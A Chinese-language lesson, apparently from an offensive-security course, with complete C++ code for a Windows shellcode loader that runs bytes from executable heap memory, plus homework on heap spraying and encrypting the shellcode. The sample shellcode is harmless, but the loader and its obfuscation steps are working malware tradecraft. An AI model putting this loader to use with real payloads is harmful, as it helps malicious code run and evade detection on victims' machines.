# 课时07 - C++可执行堆实现ShellCode Loader

## 课程目标
1. 理解Windows堆内存管理机制
2. 掌握创建可执行堆的方法
3. 实现使用堆内存执行ShellCode
4. 了解堆执行的优缺点

## 名词解释

| 术语 | 全称 | 解释 |
|------|------|------|
| Heap | 堆 | 动态分配的内存区域 |
| HeapCreate | - | 创建私有堆 |
| HEAP_CREATE_ENABLE_EXECUTE | - | 允许堆内存执行的标志 |
| HeapAlloc | - | 从堆分配内存 |
| Private Heap | 私有堆 | 进程专用的堆 |

## 代码实现

```cpp
// heap_loader.cpp
// 可执行堆ShellCode Loader

#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90,
    0x31, 0xC0, 0x40, 0xC3
};

// 方法1: HeapCreate创建可执行堆
void Method1_ExecutableHeap() {
    printf("[*] Method 1: Executable Heap\n");
    
    // 创建可执行堆
    HANDLE hHeap = HeapCreate(
        HEAP_CREATE_ENABLE_EXECUTE,  // 允许执行
        0,                            // 初始大小
        0                             // 最大大小(0=可增长)
    );
    
    if (!hHeap) {
        printf("[-] HeapCreate failed\n");
        return;
    }
    
    printf("[+] Executable heap created: %p\n", hHeap);
    
    // 分配内存
    LPVOID mem = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(shellcode));
    if (!mem) {
        HeapDestroy(hHeap);
        return;
    }
    
    printf("[+] Allocated at: %p\n", mem);
    
    // 复制ShellCode
    memcpy(mem, shellcode, sizeof(shellcode));
    
    // 执行
    typedef int (*SC_FUNC)();
    SC_FUNC func = (SC_FUNC)mem;
    int result = func();
    
    printf("[+] Returned: %d\n", result);
    
    // 清理
    HeapFree(hHeap, 0, mem);
    HeapDestroy(hHeap);
}

// 方法2: 默认进程堆 + VirtualProtect
void Method2_ProcessHeap() {
    printf("[*] Method 2: Process Heap + VirtualProtect\n");
    
    HANDLE hHeap = GetProcessHeap();
    
    LPVOID mem = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(shellcode));
    if (!mem) return;
    
    memcpy(mem, shellcode, sizeof(shellcode));
    
    // 修改权限
    DWORD oldProtect;
    VirtualProtect(mem, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtect);
    
    typedef int (*SC_FUNC)();
    int result = ((SC_FUNC)mem)();
    
    printf("[+] Returned: %d\n", result);
    
    VirtualProtect(mem, sizeof(shellcode), oldProtect, &oldProtect);
    HeapFree(hHeap, 0, mem);
}

// 方法3: 多次分配混淆
void Method3_MultiAlloc() {
    printf("[*] Method 3: Multiple Allocations\n");
    
    HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    if (!hHeap) return;
    
    // 分配多块内存，混淆真实位置
    LPVOID blocks[10];
    for (int i = 0; i < 10; i++) {
        blocks[i] = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x100);
    }
    
    // 随机选择一块放置ShellCode
    int index = 5;
    memcpy(blocks[index], shellcode, sizeof(shellcode));
    
    typedef int (*SC_FUNC)();
    int result = ((SC_FUNC)blocks[index])();
    
    printf("[+] Returned: %d\n", result);
    
    for (int i = 0; i < 10; i++) {
        HeapFree(hHeap, 0, blocks[i]);
    }
    HeapDestroy(hHeap);
}

int main() {
    printf("========================================\n");
    printf("     Executable Heap Loader            \n");
    printf("========================================\n\n");
    
    Method1_ExecutableHeap();
    printf("\n");
    
    Method2_ProcessHeap();
    printf("\n");
    
    Method3_MultiAlloc();
    
    return 0;
}
```

## 课后作业

### 作业1：实现堆喷射
使用多次堆分配实现简单的堆喷射技术。

### 作业2：添加堆加密
在堆中存储加密的ShellCode，执行前解密。
